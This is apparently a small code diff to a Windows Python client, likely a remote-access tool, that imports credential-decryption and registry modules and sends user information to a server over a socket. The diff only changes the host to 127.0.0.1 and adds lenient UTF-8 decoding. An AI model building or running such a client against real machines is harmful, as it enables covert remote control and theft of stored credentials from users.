@@ -3,7 +3,7 @@ import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
 
-strHost = ""
+strHost = "127.0.0.1"
 # strHost = socket.gethostbyname("")
 intPort = 3000
 
@@ -100,7 +100,7 @@ def server_connect():
     send(str.encode(strUserInfo))
 
 # function to return decoded utf-8
-decode_utf8 = lambda data: data.decode("utf-8")
+decode_utf8 = lambda data: data.decode("utf-8", errors="replace")
 
 # function to receive and decrypt data
 recv = lambda buffer: objSocket.recv(buffer)
